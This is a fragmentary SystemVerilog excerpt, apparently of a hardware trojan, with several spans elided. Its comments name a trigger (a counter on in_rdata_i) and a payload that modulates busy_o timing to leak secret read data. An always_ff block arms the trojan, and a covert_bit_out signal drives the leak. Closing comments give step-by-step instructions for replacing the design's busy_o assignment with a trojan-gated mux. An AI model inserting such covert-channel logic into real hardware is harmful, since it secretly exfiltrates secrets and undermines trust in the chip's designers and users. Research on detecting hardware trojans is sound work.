 ...
 *   
 * Trigger: Counter on in_rdata_i
 * Payload: Modulate busy_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |in_rdata_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of busy_o:
...
logic       covert_bit_out;         // Drives busy_o when trojan active
...
//   Find the assign for busy_o (or rd_error_o as fallback):
//     assign busy_o = <normal_expr>;
//   Replace with:
//     assign busy_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
